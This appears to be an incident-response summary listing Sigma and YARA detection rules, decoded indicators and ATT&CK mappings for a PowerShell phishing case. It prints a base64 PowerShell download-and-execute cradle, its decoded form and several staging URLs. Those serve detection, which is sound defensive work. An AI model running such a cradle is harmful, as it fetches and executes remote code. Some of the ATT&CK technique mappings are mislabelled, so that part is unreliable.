# Incident Rules Summary - INC-2026-0417

## Directory: /output/incident_rules/

### Sigma Rule
- suspicious_powershell_outlook.yml
  - Detects PowerShell with -ExecutionPolicy Bypass and -WindowStyle Hidden
  - Specifically when launched from Outlook process
  - Validated with pySigma (PASS)

### YARA Rules
- yara_suspicious_download.yar
  - Detects encoded PowerShell commands (IEX + WebClient + DownloadString)
  - Looks for suspicious URL patterns (192.168.1.100)
  - References AmsiUtils API interception

- yara_test_file.yar
  - Simple test rule for validation purposes

### Decoded IOCs
- Base64: SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAdABhAGcAZQAuAHAAcwAnACkA
- Decoded: IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/stage.ps')
- Suspicious URLs: http://192.168.1.100/stage1.ps1, http://192.168.1.101/beacon.exe, http://malicious-domain.ru/payload.dll

### Related MITRE ATT&CK Techniques
- T1059.001: PowerShell
- T1059: Command-Line Interface
- T1068: Exploitation for Privilege Escalation (scheduled tasks)
- T1566.002: Phishing: Malicious Link (email attachment)

### Evidence Analyzed
- /incident/web_access.log - Web server access logs
- /incident/app.log - Application logs
- /incident/edr_events.jsonl - Endpoint detection and response events
- /incident/facture_2024-11.ps1.txt - Suspicious PowerShell script
- /incident/ticket_INC-2026-0417.md - Incident ticket with requirements